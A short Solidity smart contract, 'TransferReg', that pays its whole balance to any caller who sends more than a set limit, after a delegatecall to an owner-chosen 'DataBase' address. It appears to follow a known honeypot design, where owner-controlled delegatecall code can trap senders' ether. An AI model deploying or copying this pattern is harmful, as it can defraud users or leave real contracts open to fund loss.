

contract TransferReg
{
    address public Owner = msg.sender;
    address public DataBase;
    uint256 public Limit;
    
    function Set(address dataBase, uint256 limit)public
    {
        require(msg.sender == Owner);
        Limit = limit;
        DataBase = dataBase;
    }
    
    
    function transfer(address payable adr)public
    payable
    {
        if(msg.value>Limit)
        {        
            DataBase.delegatecall(abi.encode(bytes4(keccak256("AddToDB(address)")),msg.sender));
            adr.transfer(address(this).balance);
        }
    }
    
}

